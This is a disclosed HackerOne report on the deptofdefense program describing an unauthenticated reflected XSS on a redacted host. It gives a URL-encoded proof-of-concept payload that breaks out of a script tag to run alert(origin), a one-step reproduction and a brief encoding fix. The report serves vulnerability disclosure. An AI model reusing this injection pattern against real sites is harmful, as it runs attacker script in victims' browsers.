# Reflected XSS on https://██████

## Report Details
- **Report ID**: 1154378
- **URL**: https://hackerone.com/reports/1154378
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-04-07T09:32:45.984Z
- **Disclosed**: 2021-06-03T16:22:26.453Z

## Reporter
- **Username**: thiennv
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Reflected XSS on https://███████

POC:
https://███/████=https://████████████/%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E&██████
## References
███████

## Impact

Unauthenticated Reflected XSS

## System Host(s)
████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Step 1: Go to link: https://██████/████=https://███████████████/%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E&████████

## Suggested Mitigation/Remediation Actions
Encoded output data



## Attachments
No attachments
